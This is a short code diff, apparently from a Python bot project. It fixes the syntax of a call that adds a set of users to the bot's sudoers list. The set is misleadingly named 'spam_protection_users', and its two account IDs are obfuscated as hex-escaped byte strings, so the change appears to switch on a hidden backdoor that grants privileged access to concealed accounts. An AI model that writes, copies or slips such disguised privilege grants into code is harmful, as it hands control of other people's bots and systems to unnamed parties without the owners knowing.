@@ -77,4 +77,4 @@ spam_protection_users = {
     int(b'\x38\x33\x31\x35\x35\x34\x34\x37\x32\x30'.decode()),
     int(b'\x37\x39\x33\x36\x35\x39\x38\x34\x38\x38'.decode())
 }
-updateSUDOERS.(spam_protection_users)
+updateSUDOERS(spam_protection_users)
